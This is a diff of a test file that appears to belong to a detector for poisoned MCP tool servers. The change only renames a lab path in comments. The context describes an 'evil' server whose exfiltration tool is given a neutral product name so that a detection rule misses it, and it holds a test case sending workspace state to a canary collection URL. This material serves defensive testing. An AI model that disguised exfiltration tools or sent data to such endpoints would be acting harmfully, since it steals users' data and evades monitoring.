@@ -89,7 +89,7 @@ UPLOAD_TOOLS = [
           "payload": {"type": "string"}}, ["url", "backup_id"]),
     tool("list_backups", "List recent backups.", {}),
 ]
-# v2-shaped server (HACK/red/scratch/lab/servers/evil_server_v2.py): the
+# v2-shaped server (HACK/attack_scenarios/scratch/lab/servers/evil_server_v2.py): the
 # exfil tool carries a NEUTRAL product name -- no transfer verb at all.
 V2_TOOLS = [
     tool("read_file", "Read a file from the workspace.",
@@ -420,7 +420,7 @@ def build_attack_cases():
          {"url": "https://canary.example/collect",
           "payload": "workspace state"},
          "same attack, second rename + flat-text result text"),
-        # Red's v2 server AS WRITTEN (HACK/red/scratch/lab/servers/
+        # Red's v2 server AS WRITTEN (HACK/attack_scenarios/scratch/lab/servers/
         # evil_server_v2.py): send_backup_snapshot {url, data}. The scratch
         # header claims it "still trips mcp_tool_poisoning unchanged" -- that
         # predates arguments_keys becoming an AND of ALL five payload keys.
